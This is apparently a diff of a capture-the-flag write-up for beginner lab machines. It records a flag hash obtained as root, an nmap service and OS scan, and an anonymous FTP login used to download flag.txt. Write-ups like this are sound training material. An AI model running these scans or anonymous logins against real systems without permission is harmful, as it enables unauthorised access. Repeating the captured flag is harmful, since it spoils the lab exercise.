@@ -67,7 +67,6 @@ root@Meow:~# cat flag.txt
 
 b40abdfe23665f766f9c61ecba8a4c19
 
-/home/kali/Pictures/meow flag.png
 
 ### Key Takeaway
 Telnet is unencrypted and legacy. Root with no password
@@ -86,10 +85,12 @@ Time in Box: 5 minutes
 
 ### Enumeration
 nmap -sV -sC -O 10.129.1.14
-Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-05 22:25 -0500
+
 Nmap scan report for 10.129.1.14
+
 Host is up (0.060s latency).
 Not shown: 999 closed tcp ports (reset)
+
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 3.0.3
 | ftp-syst: 
@@ -107,10 +108,12 @@ PORT   STATE SERVICE VERSION
 |_End of status
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
 |_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
+
 Device type: general purpose
 Running: Linux 4.X|5.X
 OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
 OS details: Linux 4.15 - 5.19
+
 Network Distance: 2 hops
 Service Info: OS: Unix
 
@@ -123,19 +126,23 @@ Name (10.129.1.14:kali): Anonymous
 331 Please specify the password.
 Password: 
 230 Login successful.
+
 Remote system type is UNIX.
 Using binary mode to transfer files.
 ftp> 
 ftp> ls
+
 229 Entering Extended Passive Mode (|||34732|)
 150 Here comes the directory listing.
 -rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
 226 Directory send OK.
+
 ftp> get  flag.txt
 local: flag.txt remote: flag.txt
 229 Entering Extended Passive Mode (|||34470|)
 150 Opening BINARY mode data connection for flag.txt (32 bytes).
 100% |**************************************************************************************************************|    32        0.39 KiB/s    00:00 ETA
+
 226 Transfer complete.
 32 bytes received in 00:00 (0.20 KiB/s)
 ftp> bye
